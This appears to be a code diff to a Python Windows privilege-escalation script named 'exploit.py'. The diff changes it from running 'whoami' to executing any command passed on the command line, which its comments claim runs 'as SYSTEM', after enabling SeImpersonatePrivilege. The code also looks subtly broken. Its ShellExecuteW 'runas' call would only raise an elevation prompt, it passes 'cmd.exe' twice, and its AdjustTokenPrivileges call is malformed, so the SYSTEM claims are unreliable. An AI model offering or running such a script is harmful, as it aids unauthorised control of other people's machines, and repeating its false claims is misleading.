@@ -13,12 +13,22 @@ def enable_privilege(privilege_name):
     tkp = ctypes.c_void_p()
     ctypes.windll.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(luid), 0, None, None)
 
-def main():
+def run_command(command):
+    """Run a command as SYSTEM."""
+    # Create a new process with SYSTEM privileges
+    command_line = f"cmd.exe /c {command}"
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", command_line, None, 1)
+
+def main(command):
     # Enable the SeImpersonatePrivilege
     enable_privilege("SeImpersonatePrivilege")
 
-    # Execute the whoami command as an administrator
-    os.system("whoami")
+    # Execute the command as SYSTEM
+    run_command(command)
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 2:
+        print("Usage: python exploit.py '<command>'")
+        sys.exit(1)
+
+    main(sys.argv[1])
